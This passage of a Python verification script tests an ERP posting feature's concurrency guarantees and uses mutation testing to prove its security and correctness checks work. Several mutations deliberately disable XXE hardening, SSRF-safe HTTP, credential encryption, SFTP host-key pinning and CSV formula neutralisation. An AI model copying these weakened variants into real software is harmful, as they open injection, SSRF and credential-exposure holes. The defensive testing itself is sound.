                                       input_digest="d" * 64, policy_version="x", line_count=1, exception_count=0,
                                       variance_micros=0, resolved_at=T0, resolved_by_user_id=user)
                    seed.insert("procurement_case_lines", id=uuid.uuid4(), organization_id=org, workspace_id=ws,
                                case_id=case["id"], line_number=1, outcome="MATCHED", description="Service", sku="SVC-100",
                                po_line_index=0, po_quantity=1, po_unit_price_micros=100_000_000, po_amount_micros=100_000_000,
                                invoice_line_index=0, invoice_quantity=1, invoice_unit_price_micros=100_000_000,
                                invoice_amount_micros=100_000_000)
                    cases.append(case["id"])
            with Session(engine) as db:
                t_ = service.create_target(db, organization_id=org, workspace_id=ws, actor_user_id=user, name="X REST",
                                           format="JSON", transport="HTTP", preset="GENERIC_REST", auth_mode="BEARER",
                                           config=rest_config(erp, "GENERIC_REST"), credential={"token": "static-token"},
                                           check_network=False)
                for row in db.execute(sa.text("SELECT id, name FROM erp_lookup_tables WHERE workspace_id = :w"), {"w": ws}).all():
                    base = row.name.rsplit("_", 1)[-1]
                    db.execute(sa.text("UPDATE erp_lookup_tables SET entries = CAST(:e AS jsonb) WHERE id = :i"),
                               {"e": json.dumps(S.LOOKUPS.get(base, {})), "i": row.id})
                db.commit()
                target_id = t_.id

            def run(n: int, fn: Callable[[Session], Any]) -> list[Any]:
                barrier = threading.Barrier(n)
                results: list[Any] = [None] * n

                def work(i: int) -> None:
                    with Session(engine) as db:
                        barrier.wait(timeout=30)
                        try:
                            results[i] = fn(db)
                            db.commit()
                        except Exception as exc:  # noqa: BLE001
                            db.rollback()
                            results[i] = exc
                threads = [threading.Thread(target=work, args=(i,)) for i in range(n)]
                for th in threads:
                    th.start()
                for th in threads:
                    th.join(timeout=120)
                return results

            def plan(db: Session, case_id: uuid.UUID) -> tuple[str, bool]:
                target = db.get(ErpTarget, target_id)
                p, created = service.plan(db, target=target, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                          object_kind="VENDOR_BILL", origin="FLOW", actor_user_id=None)
                return str(p.id), created

            planned = run(16, lambda db: plan(db, cases[0]))
            errors = [r for r in planned if isinstance(r, Exception)]
            assert not errors, f"concurrent planning raised: {errors[:2]}"
            assert len({r[0] for r in planned}) == 1 and sum(1 for r in planned if r[1]) == 1, planned
            with engine.connect() as c:
                n_rows = c.execute(sa.text("SELECT count(*) FROM erp_postings WHERE target_id = :t"), {"t": target_id}).scalar_one()
            assert n_rows == 1, f"{n_rows} postings for one object"
            report["plan"] = {"workers": 16, "created": 1, "rows": n_rows}
            pid = uuid.UUID(planned[0][0])
            erp.reset()
            delivered = run(12, lambda db: service.deliver(db, pid))
            errors = [r for r in delivered if isinstance(r, Exception)]
            assert not errors, f"concurrent delivery raised: {errors[:2]}"
            sent = erp.count("POST", "/postings/")
            assert sent == 1 and sum(1 for r in delivered if r.get("delivered")) == 1, (sent, delivered)
            with Session(engine) as db:
                assert db.get(ErpPosting, pid).state == "DONE"
            report["deliver"] = {"workers": 12, "sends": sent}
            # the first send's answer is lost after the target committed: every worker racing it sends nothing more
            with Session(engine) as db:
                p2, _ = service.plan(db, target=db.get(ErpTarget, target_id), source_kind="PROCUREMENT_CASE",
                                     source_id=cases[1], object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user)
                db.commit()
                pid2 = p2.id
            before = erp.count("POST", "/postings/")
            erp.fault("POST /postings/", "reset_after")
            raced = run(8, lambda db: service.deliver(db, pid2))
            with Session(engine) as db:
                final = db.get(ErpPosting, pid2)
                state = final.state
            stored = erp.created("vendor_bill")
            posts = erp.count("POST", "/postings/") - before
            assert posts == 1, f"{posts} sends after a lost answer"
            # generic REST has no look-up: the outcome is UNCERTAIN (a person decides) -- never re-sent blind
            assert state == "UNCERTAIN" and len([x for x in stored if x.get("documentNumber") == "INV-X-1"]) == 1, (state, stored)
            report["lost_answer"] = {"workers": 8, "sends": posts, "state": state, "stored": len(stored),
                                     "results": [r if isinstance(r, dict) else repr(r) for r in raced][:3]}
            return report
    finally:
        for target_, attr, value in reversed(saved):
            setattr(target_, attr, value)
        with engine.begin() as conn:
            conn.execute(sa.text("DELETE FROM jobs WHERE organization_id = :o"), {"o": org})
            conn.execute(sa.text("DELETE FROM outbox_events WHERE organization_id = :o"), {"o": org})
            conn.execute(sa.text("DELETE FROM organizations WHERE id = :o"), {"o": org})
            conn.execute(sa.text("DELETE FROM users WHERE id = :u"), {"u": user})
        with engine.connect() as conn:
            left = conn.execute(sa.text("SELECT count(*) FROM erp_postings WHERE organization_id = :o"), {"o": org}).scalar_one()
        assert left == 0, "the concurrency organization was not cleaned up"


def db_layer(rec: Recorder, evidence: dict, mutate: bool) -> None:
    print("\nDatabase")
    import sqlalchemy as sa

    def head() -> None:
        from app.db.session import engine

        with engine.connect() as conn:
            current = [r[0] for r in conn.execute(sa.text("SELECT version_num FROM alembic_version"))]
            tables = {r[0] for r in conn.execute(sa.text("SELECT table_name FROM information_schema.tables WHERE table_schema='public'"))}
            kinds = conn.execute(sa.text("SELECT pg_get_constraintdef(oid) FROM pg_constraint WHERE conname='ck_review_assignments_kind_known'")).scalar_one()
            outbox = conn.execute(sa.text("SELECT pg_get_constraintdef(oid) FROM pg_constraint WHERE conname='ck_outbox_events_visibility_vocabulary'")).scalar_one()
            view = conn.execute(sa.text("SELECT pg_get_viewdef('review_queue_items'::regclass)")).scalar_one()
            ledger = conn.execute(sa.text("SELECT pg_get_constraintdef(oid) FROM pg_constraint WHERE conname='uq_erp_postings_ledger'")).scalar_one()
        assert current in ([A47], [STEP3]), f"alembic current is {current}; run run_arch47.ps1"
        assert not [x for x in TABLES if x not in tables], "ARCH-47 tables missing"
        assert "POSTING" in kinds and "trigger.posting.failed" in outbox and "POSTING_EXCEPTION" in view
        assert "UNIQUE (target_id, object_kind, source_kind, source_id)" in ledger

    if not rec.check("db", "D1 database at arch47: 5 tables, the ledger key, POSTING in the hub, posting.failed in the outbox CHECK", head):
        return
    base_run = not ONLY or any(p[0] == "D" for p in ONLY)
    results = live_e2e() if base_run else []
    if base_run:
        evidence["live"] = [{"step": n_, "ok": ok, "detail": d} for n_, ok, d in results]
    for name, ok, detail in results:
        rec.check("db", name, (lambda: None) if ok else (lambda d=detail: (_ for _ in ()).throw(AssertionError(d))))
    x1_ok = rec.check("db", "X1 exactly once under real concurrency (committed, then deleted): 16 planners -> 1 posting; 12 deliverers -> 1 send; a lost answer raced by 8 -> 1 send, UNCERTAIN",
                      lambda: evidence.__setitem__("concurrency", concurrency_gate()))
    if not mutate:
        return
    #: ARCH47-S1:mutation-baseline. A mutation proves something only if its gate PASSES on the real code: a gate
    #: that already fails (a refused connection on Windows, say) would "catch" every mutation aimed at it.
    baseline = {name.split(" ", 1)[0]: ok for name, ok, _ in results}
    baseline["X1"] = bool(x1_ok)

    def sound(step_prefix: str) -> None:
        if base_run and baseline.get(step_prefix) is False:
            raise AssertionError(f"not evidence: {step_prefix} fails on the unmutated code, so it would 'catch' "
                                 "anything; fix it first")

    from app.api.v1 import erp as api_module
    from app.services.erp import gate as gate_module
    from app.services.erp import service as service_module
    from app.services.erp.formats import jsonapi as jsonapi_module
    from app.services.review import resolution

    def must_fail(step_prefix: str, build: Callable[[], list]) -> Callable[[], None]:
        def run() -> None:
            sound(step_prefix)
            patches = build()  # anchors first: a drifted anchor raises AnchorMissing, never "caught"
            for target, attr, _ in patches:
                if not hasattr(target, attr):
                    raise AnchorMissing(f"{getattr(target, '__name__', target)}.{attr} missing")
            steps = live_e2e(patches, until=step_prefix)
            named = [(ok, d) for n_, ok, d in steps if n_.startswith(step_prefix)]
            assert named, f"no step {step_prefix}"
            assert not all(ok for ok, _ in named), f"{step_prefix} passed against broken code"
            CAUGHT.append(f"{step_prefix}: " + next(d for ok, d in named if not ok)[:300])
        return run

    def must_fail_x(build: Callable[[], list]) -> Callable[[], None]:
        def run() -> None:
            sound("X1")
            patches = build()
            for target, attr, _ in patches:
                if not hasattr(target, attr):
                    raise AnchorMissing(f"{getattr(target, '__name__', target)}.{attr} missing")
            expect_failure(lambda: concurrency_gate(patches))
        return run

    db_caught: dict[str, str] = {}
    evidence["db_caught_by"] = db_caught

    def md(name: str, fn: Callable[[], None]) -> None:
        CAUGHT.clear()
        if rec.check("mutation", name, fn) and CAUGHT:
            db_caught[name] = CAUGHT[-1]

    plan_guard = ('    existing = ledger_row(db, target.id, object_kind, source_kind, source_id)\n    if existing is not None:\n'
                  '        return existing, False\n')
    md("MD1 the ERP API's capability gate removed (D5 must catch)",
       must_fail("D5", lambda: [(api_module, "_gate", lambda *a, **k: None)]))
    md("MD2 planning without the ledger look-up and ON CONFLICT (a second 'Post' is a second posting; D4 must catch)",
       must_fail("D4", lambda: [(service_module, "plan", variant2("service", [
           (plan_guard, ""), (".on_conflict_do_nothing()\n", "\n")], "plan"))]))
    md("MD3 no probe after an uncertain send (a lost answer is re-sent or failed blind; D7 must catch)",
       must_fail("D7", lambda: [(service_module, "_talk_http", variant("service", "    if r.kind == v.OUTCOME_UNCERTAIN:\n        state, ext, why = probe()",
                                                                      "    if False:\n        state, ext, why = probe()", "_talk_http"))]))
    md("MD4 the acknowledgement ignores the echoed figures (a different total is DONE; D7 must catch)",
       must_fail("D7", lambda: [(jsonapi_module, "acknowledge", variant("jsonapi", "    if problems:\n        return Acknowledgement(v.OUTCOME_MISMATCH",
                                                                        "    if False:\n        return Acknowledgement(v.OUTCOME_MISMATCH", "acknowledge"))]))
    md("MD5 posting.failed keyed without the exception number (raised again on every save; D4 must catch)",
       must_fail("D4", lambda: [(service_module, "_emit_failed", variant(
           "service", 'idempotency_key=f"{v.EVENT_POSTING_FAILED}:{posting.id}:{posting.exception_seq}"',
           'idempotency_key=f"{v.EVENT_POSTING_FAILED}:{posting.id}:{__import__(\'uuid\').uuid4()}"', "_emit_failed"))]))
    md("MD6 the hub cannot resolve POSTING (D9 must catch)", must_fail("D9", lambda: [
        (resolution, "_DISPATCH", {k: fn for k, fn in resolution._DISPATCH.items() if k != "POSTING"})]))
    md("MD7 ARCH-20 erasure keeps what postings quote (D13 must catch)",
       must_fail("D13", lambda: [(service_module, "erase_for_work_items", lambda db, ids: 0)]))
    md("MD8 the delivery job ignores the plan (D12 must catch)",
       must_fail("D12", lambda: [(gate_module, "capability_held", lambda *a, **k: True)]))
    md("MD9 auto-post reaches back before it was switched on (D11 must catch)",
       must_fail("D11", lambda: [(service_module, "sweep", variant("service", "since=target.auto_post_since,", "since=None,", "sweep"))]))
    md("MD10 a rotated OAuth refresh token is not stored (the next refresh fails; D6 must catch)",
       must_fail("D6", lambda: [(service_module, "_record", variant("service", "    if result.credential is not None and target is not None:",
                                                                    "    if False:", "_record"))]))
    md("MD11 S/4HANA written without its CSRF token (D6 must catch)", must_fail("D6", lambda: [
        (jsonapi_module, "PRESETS", {**jsonapi_module.PRESETS,
                                     "S4HANA_ODATA": __import__("dataclasses").replace(jsonapi_module.PRESETS["S4HANA_ODATA"], csrf=False)})]))
    md("MD12 the SFTP host key not compared with the pin (an impostor receives the file; D8 must catch)",
       must_fail("D8", lambda: [(__import__("app.services.erp.transport.sftp", fromlist=["Connection"]), "Connection",
                                 variant("sftp", '            if seen != cfg["pin"]:', '            if False:', "Connection"))]))
    md("MD13 retries never exhaust (a failing posting retries forever; D7 must catch)",
       must_fail("D7", lambda: [(service_module, "_record", variant("service", "    if state == v.STATE_RETRYING and row.attempts >= row.max_attempts:",
                                                                    "    if False:", "_record"))]))
    md("MD14 an expired lease re-sends without probing (D7 must catch)",
       must_fail("D7", lambda: [(service_module, "_claim", variant("service", "        probe_first = True   # the worker that held it disappeared mid-send",
                                                                   "        probe_first = False  # the worker that held it disappeared mid-send", "_claim"))]))
    md("MD15 a private target URL accepted at registration (D5 must catch)",
       must_fail("D5", lambda: [(service_module, "_preflight_url", lambda *a, **k: None)]))
    md("MD16 the credential stored in the clear (D5 must catch)",
       must_fail("D5", lambda: [(service_module, "_encrypt", lambda cred: (json.dumps(dict(cred)), "0" * 12))]))
    md("MX1 claiming without the row lock and lease (two workers send the same posting; X1 must catch)",
       must_fail_x(lambda: [(service_module, "_claim", variant2("service", [
           (".with_for_update(skip_locked=True)).scalar_one_or_none()", ").scalar_one_or_none()"),
           ("    if row.state in v.SENDABLE_STATES and (row.next_attempt_at is None or row.next_attempt_at <= stamp):",
            "    if row.state in (*v.SENDABLE_STATES, v.STATE_SENDING, v.STATE_DONE):"),
           ("        probe_first = bool((row.ack or {}).get(\"probe_first\"))", "        probe_first = False")], "_claim")),
                             (service_module, "_record", variant("service", "    if row is None or row.lease_token != token or row.state != v.STATE_SENDING:",
                                                                 "    if row is None:", "_record"))]))


# ===========================================================================
# Static mutations
# ===========================================================================


def mutations() -> list[tuple[str, Callable[[], None]]]:
    from dataclasses import replace as dc_replace

    from app.services.automation import actions as actions_module
    from app.services.erp import mapping as M
    from app.services.erp import presets as PR
    from app.services.erp import service as SV
    from app.core import ssrf_client
    from app.services.erp.formats import jsonapi, tabular, x12, xmlsafe, xsd
    from app.services.erp.transport import http as H
    from app.services.erp.transport import sftp as SF

    texts = texts_all()

    def texts_with(key: str, text: str) -> dict:
        out = dict(texts)
        out[key] = text
        return out

    def cap(index: int, old: str, new: str) -> tuple:
        args = [texts["ent"], texts["capgate"], texts["seed"], texts["fe_caps"], texts["fe_plan"], texts["fe_nav"],
                texts["v36"], texts["vhm"]]
        args[index] = swap(args[index], old, new)
        return tuple(args)

    def under(patches: list, gate: Callable[[], Any]) -> Callable[[], None]:
        def run() -> None:
            with patched(*patches):
                expect_failure(gate)
        run.gate = gate  # type: ignore[attr-defined]  # checked unmutated first (main)
        return run

    def no_jitter(attempt: int, retry_after: Optional[int] = None, *, rng: Any = None) -> int:
        return max(30 * (2 ** max(0, attempt - 1)), int(retry_after or 0))   # no ceiling, no jitter

    def ignores_retry_after(attempt: int, retry_after: Optional[int] = None, *, rng: Any = None) -> int:
        return real_backoff(attempt, None, rng=rng)

    real_backoff = SV.backoff_seconds
    lax_mapping = variant("mapping", "        for marker in _TEMPLATE_MARKERS:\n            if marker in value:",
                          "        for marker in ():\n            if marker in value:", "validate")
    migration = texts["migration"]
    wider = dc_replace(actions_module.ACTIONS["erp.post"], config_model=type(
        "Wider", (actions_module.ACTIONS["erp.post"].config_model,), {"__annotations__": {"amount": Optional[str]},
                                                                      "amount": None}))
    return [
        ("MS1 capability missing from the Business tier", mutation(lambda: cap(2, '    _capability("capability.erp_posting"),  # ARCH47-S1:tier-business\n', ""), check_capability)),
        ("MS2 capability leaked below Business", mutation(lambda: cap(2, "DEVELOPER_FEATURES = [\n", 'DEVELOPER_FEATURES = [\n    _capability("capability.erp_posting"),\n'), check_capability)),
        ("MS3 no Entitlement entry (has_capability would raise)", mutation(lambda: cap(0, "name=ERP_POSTING_CAPABILITY", "name=OBLIGATIONS_CAPABILITY"), check_capability)),
        ("MS4 no plan card lists ERP posting", mutation(lambda: cap(4, "  CAPABILITY.erpPosting,\n", ""), check_capability)),
        ("MS5 contract step left on arch46 (two heads)", mutation(lambda: (migration, {**_revisions(), STEP3: f'"{A46}"'}), check_migration)),
        ("MS6 the ledger's unique key dropped", mutation(lambda: (swap(migration, "CONSTRAINT uq_erp_postings_ledger UNIQUE (target_id, object_kind, source_kind, source_id)", "CONSTRAINT uq_erp_postings_ledger CHECK (true)"),), check_migration)),
        ("MS7 the idempotency key's uniqueness dropped", mutation(lambda: (swap(migration, "CONSTRAINT uq_erp_postings_idempotency UNIQUE (idempotency_key)", "CONSTRAINT uq_erp_postings_idempotency CHECK (true)"),), check_migration)),
        ("MS8 a queued posting may lack its bytes (the rendered CHECK dropped)", mutation(lambda: (swap(migration, "CONSTRAINT ck_erp_postings_rendered CHECK", "CONSTRAINT ck_gone CHECK (true) AND"),), check_migration)),
        ("MS9 UBL amounts without currencyID", under([(xsd, "UBL_SCHEMAS", xsd.UBL_SCHEMAS)] + [(
            __import__("app.services.erp.formats.ubl", fromlist=["render"]), "render",
            variant("ubl", "        self.cbc(parent, name, Decimal(str(value)), currencyID=currency)",
                    "        self.cbc(parent, name, Decimal(str(value)))", "render"))], check_goldens)),
        ("MS10 X12 SE01 off by one", under([(x12, "render", variant("x12", '    body.append(["SE", str(len(body) + 1), control.transaction])',
                                                                    '    body.append(["SE", str(len(body)), control.transaction])', "render"))], check_goldens)),
        ("MS11 CSV formula neutralisation removed", under([(tabular, "_neutral", lambda text: text)], check_tabular_safety)),
        ("MS12 XLSX zip timestamps from the clock (not deterministic)", under([(tabular, "_FIXED_TIME", (2031, 5, 6, 7, 8, 10))], check_tabular_safety)),
        ("MS13 the mapping language accepts templates", under([(M, "validate", lax_mapping)], check_mapping_refusals)),
        ("MS14 executable keys only refused as unknown keys", under([(M, "_EXECUTABLE_KEYS", frozenset())], check_mapping_refusals)),
        ("MS15 mapping.py evaluates something", _with_file("mapping", "def spec_sha(spec: Mapping) -> str:\n",
                                                          "def spec_sha(spec: Mapping) -> str:\n    eval('1')\n", check_mapping_refusals)),
        ("MS16 a TAX / AP line falls back to the default expense account", under([(PR, "LINE_ACCOUNT", PR.COAL(
            PR.P("line.account"), PR.P("line.account_code", PR.LK("accounts", "null")), PR.P("line.code", PR.LK("accounts", "null")),
            PR.K("default", PR.LK("accounts"))))], lambda: check_mapping_semantics())),
        ("MS17 money always written with two decimals (KWD loses a fils)", under([(M._Eval, "transform", variant(
            "mapping", 'decimals = int(t["decimals"]) if t.get("decimals") is not None else v.currency_exponent(self.currency)',
            'decimals = int(t.get("decimals") if t.get("decimals") is not None else 2)', "_Eval").transform)], check_mapping_semantics)),
        ("MS18 X12 N2 rounds a 3-decimal amount silently", under([(x12, "_n2", lambda value: str(int((Decimal(str(value)) * 100).quantize(Decimal(1)))))], check_held_out)),
        ("MS19 a 997 of another group settles ours", under([(x12, "correlate", variant(
            "x12", '    if ack.group_control != str(control_numbers.get("gs06")) or ack.functional_id != FUNCTIONAL_ID[ts]:',
            '    if ack.functional_id != FUNCTIONAL_ID[ts]:', "correlate"))], check_x12_acks)),
        ("MS20 the REST acknowledgement ignores echoed figures", under([(jsonapi, "acknowledge", variant(
            "jsonapi", "    if problems:\n        return Acknowledgement(v.OUTCOME_MISMATCH", "    if False:\n        return Acknowledgement(v.OUTCOME_MISMATCH",
            "acknowledge"))], check_rest_acks)),
        ("MS21 the acknowledgement tolerance ignores the currency", under([(jsonapi, "acknowledge", variant(
            "jsonapi", '    tolerance = Decimal(v.ACK_AMOUNT_TOLERANCE_MINOR).scaleb(-v.currency_exponent(currency or ""))',
            '    tolerance = Decimal("0.01")', "acknowledge"))], check_rest_acks)),
        ("MS22 backoff without jitter or ceiling", under([(SV, "backoff_seconds", no_jitter)], check_backoff)),
        ("MS23 backoff ignores Retry-After", under([(SV, "backoff_seconds", ignores_retry_after)], check_backoff)),
        ("MS24 ERP calls through a raw HTTP client", _with_file("http", "SSRFSafeHTTPClient(connect_timeout=min(10.0, timeout), total_timeout=timeout)",
                                                               "__import__('httpx').Client(timeout=timeout)", check_egress)),
        ("MS25 secrets recorded unscrubbed", under([(H, "scrub", lambda text: text)], check_egress)),
        ("MS26 SFTP accepts an unpinned host key", under([(SF, "settings", variant("sftp", '    if not re.fullmatch(r"SHA256:[A-Za-z0-9+/]{43}", pin):',
                                                                                  "    if False:", "settings"))], check_egress)),
        ("MS27 the X12 validator ignores the SE count", under([(x12, "validate", variant("x12", "            if se[1:2] != [str(count)]:",
                                                                                          "            if False:", "validate"))], check_schema_refusals)),
        ("MS28 the XLSX package structure unchecked", under([(xsd, "_opc_structure", lambda z, names: [])], check_schema_refusals)),
        ("MS29 delivery registered on the OCR profile", mutation(lambda: (texts_with("profiles", swap(texts["profiles"], "OCR = WorkerProfile(\n", 'OCR = WorkerProfile(\n    # "erp.deliver_posting",\n')),), check_wiring)),
        ("MS30 posting.failed keyed without the exception number", mutation(lambda: (texts_with("service", swap(texts["service"], 'idempotency_key=f"{v.EVENT_POSTING_FAILED}:{posting.id}:{posting.exception_seq}"', 'idempotency_key=f"{v.EVENT_POSTING_FAILED}:{posting.id}"')),), check_wiring)),
        ("MS31 the hub shows POSTING without the capability", mutation(lambda: (texts_with("review_api", swap(texts["review_api"], "    if ERP_POSTING_CAPABILITY in granted:\n        kinds.append(vocab.KIND_POSTING)\n", "    kinds.append(vocab.KIND_POSTING)\n")),), check_wiring)),
        ("MS32 the conformance matrix still expects 21 triggers", mutation(lambda: (texts_with("conformance", re.sub(r"EXPECTED_TRIGGERS = 22\b", "EXPECTED_TRIGGERS = 21", texts["conformance"])),), check_wiring)),
        ("MS33 the sweep not scheduled (G14)", mutation(lambda: (texts_with("cron", swap(texts["cron"], "flowpilot-sweep erp_postings --apply", "flowpilot-sweep erp_postings-off")),), check_wiring)),
        ("MS34 erasure hook removed", mutation(lambda: (texts_with("erasure", swap(texts["erasure"], 'counts["erp_postings"] = _erp_service.erase_for_work_items(db, work_item_ids)', 'counts["erp_postings"] = 0')),), check_wiring)),
        ("MS35 erp.post takes a document-derived parameter", under([(actions_module, "ACTIONS", {**actions_module.ACTIONS, "erp.post": wider})], lambda: check_wiring(texts))),
        ("MS36 a route loses its capability gate", mutation(lambda: (swap(texts["api"], '    _gate(db, context, "erp.postings.accept")\n', ""),), check_api)),
        ("MS37 credentials settable by contributors", mutation(lambda: (swap(texts["api"], "def set_credential(workspace_id: uuid.UUID, target_id: uuid.UUID, body: CredentialSet, db: Session = Depends(get_db),\n                   context: TenantContext = Depends(RequireAdmin))",
                                                                         "def set_credential(workspace_id: uuid.UUID, target_id: uuid.UUID, body: CredentialSet, db: Session = Depends(get_db),\n                   context: TenantContext = Depends(RequireContributor))"),), check_api)),
        ("MS38 the posting file download not audited", mutation(lambda: (swap(texts["api"], "operation=\"posting_downloaded\", action=AuditAction.EXPORTED", "operation=\"posting_downloaded\""),), check_api)),
        ("MS39 console type drifts from the API", mutation(lambda: (texts_with("fe_types", swap(texts["fe_types"], "  readonly source_changed?: boolean | null;\n", "")),), check_console)),
        ("MS40 Work Item details without its ERP postings tab", mutation(lambda: (texts_with("fe_wid", swap(texts["fe_wid"], "<DocumentPostings workItemId={workItem.id} />", "<div />")),), check_console)),
        ("MS41 the console's credential fields differ from the API's", mutation(lambda: (texts_with("fe_types", swap(texts["fe_types"], 'SSH_KEY: { required: ["username", "private_key"], optional: ["passphrase"] },', 'SSH_KEY: { required: ["username"], optional: [] },')),), check_console)),
        ("MS42 a file ARCH-47 touched loses its sentinel", _with_file("gate", "ARCH47-S1:gate", "gate", check_sentinels)),
        ("MS43 untrusted ERP XML may declare a DOCTYPE (the XXE refusal removed)", under([(xmlsafe, "_declares", lambda raw: False)], check_xml_safety)),
        ("MS44 the ERP XML parser resolves entities and loads DTDs", under([(xmlsafe, "_hardened", lambda **_: __import__("lxml.etree", fromlist=["XMLParser"]).XMLParser(
            resolve_entities=True, no_network=False, load_dtd=True))], check_xml_safety)),
        ("MS45 a Tally response parsed with lxml directly (outside xmlsafe.py)", _with_file(
            "tally", "        root = xmlsafe.parse(data)  # untrusted",
            "        from lxml import etree\n        root = etree.fromstring(data)  # untrusted", check_xml_safety)),
        ("MS46 XLSX 'made by' stamped as zipfile does on Windows (Windows and Linux bytes differ)", under([(tabular, "to_xlsx", variant(
            "tabular", "            info.create_system = 3\n", "            info.create_system = 0\n", "to_xlsx"))], check_tabular_safety)),
        ("MS47 schema import URLs read by slicing 'file://' off (Windows drives and %20 break)", under([(xsd, "local_path", lambda url, windows=None: (
            url[7:] if url.startswith("file://") else url))], check_schema_paths)),
        ("MS48 a refused connect is a raw OSError (no fall-through to the next address)", under([(ssrf_client, "SSRFSafeHTTPClient", variant(
            "ssrf", "        except OSError as exc:\n            raise ConnectError(f\"Connection to {ip}:{port} failed: {exc}\") from exc\n",
            "        except ZeroDivisionError as exc:\n            raise ConnectError(f\"Connection to {ip}:{port} failed: {exc}\") from exc\n",
            "SSRFSafeHTTPClient"))], check_connect_fallback)),
        ("MS49 a failure after the request was sent is retried at the next address (a double send)", under([(ssrf_client, "SSRFSafeHTTPClient", variant(
            "ssrf", "                if isinstance(exc, ConnectError) and exc.request_sent:\n",
            "                if False:\n", "SSRFSafeHTTPClient"))], check_connect_fallback)),
    ]


def main() -> int:
    global ONLY
    parser = argparse.ArgumentParser(description="Verify ARCH-47")
    for flag in ("--db", "--mutate", "--build", "--regression"):
        parser.add_argument(flag, action="store_true")
    parser.add_argument("--only", default="", help="comma-separated gate-name prefixes (e.g. F1,MS7)")
    parser.add_argument("--evidence", default="verify_arch47.json", help="evidence file name under evidence/arch47/")
    args = parser.parse_args()
    ONLY = tuple(p.strip() for p in args.only.split(",") if p.strip())
    rec = Recorder()
    evidence: dict[str, Any] = {"started": time.strftime("%Y-%m-%dT%H:%M:%S"), "python": sys.version.split()[0]}
    t0 = time.perf_counter()
    offline(rec, evidence)
    if args.db:
        db_layer(rec, evidence, args.mutate)
    if args.mutate:
        print("\nMutations")
        caught: dict[str, str] = {}
        # ARCH47-S1:mutation-baseline. Each mutation's gate is first run on the UNMUTATED code: a gate that
        # already fails there would "catch" the mutation for the wrong reason, so the mutation is reported as a
        # failure (not evidence) instead of a pass.
        unmutated: dict[int, Optional[str]] = {}
        for name, fn in mutations():
            gate = getattr(fn, "gate", None)
            selected = not ONLY or any(name.startswith(prefix) for prefix in ONLY)
            if gate is not None and selected:
                if id(gate) not in unmutated:
                    try:
                        gate()
                        unmutated[id(gate)] = None
                    except Exception as exc:  # noqa: BLE001
                        unmutated[id(gate)] = f"{type(exc).__name__}: {exc}"[:300]
                why = unmutated[id(gate)]
                if why:
                    rec.check("mutation", name, lambda why=why: (_ for _ in ()).throw(AssertionError(
                        f"not evidence: its gate fails on the unmutated code ({why})")))
                    continue
            CAUGHT.clear()
            if rec.check("mutation", name, fn) and CAUGHT:
                caught[name] = CAUGHT[-1]
        evidence["caught_by"] = caught
    if args.build:
        print("\nBuild")
        rec.check("build", "B1 tsc -b and vite build", lambda: (_run(["npx", "tsc", "-b"], FRONTEND), _run(["npx", "vite", "build"], FRONTEND)))
        rec.check("build", f"B2 eslint --max-warnings=0 on the {len(CHANGED_FRONTEND)} ARCH-47 console files",
                  lambda: _run(["npx", "eslint", "--max-warnings=0", *CHANGED_FRONTEND], FRONTEND))
    if args.regression:
        print("\nRegression")
        rec.check("regression", "R1 verify_arch46.py --db", lambda: _run([sys.executable, "verify_arch46.py", "--db"], BACKEND, 3600))
    evidence["seconds"] = round(time.perf_counter() - t0, 1)
    evidence["results"] = [{"layer": layer, "gate": name, "outcome": outcome} for layer, name, outcome in rec.results]
    EVIDENCE.mkdir(parents=True, exist_ok=True)
    (EVIDENCE / args.evidence).write_text(json.dumps(evidence, indent=2, default=str), encoding="utf-8")
    return rec.summary()


if __name__ == "__main__":
    sys.exit(main())
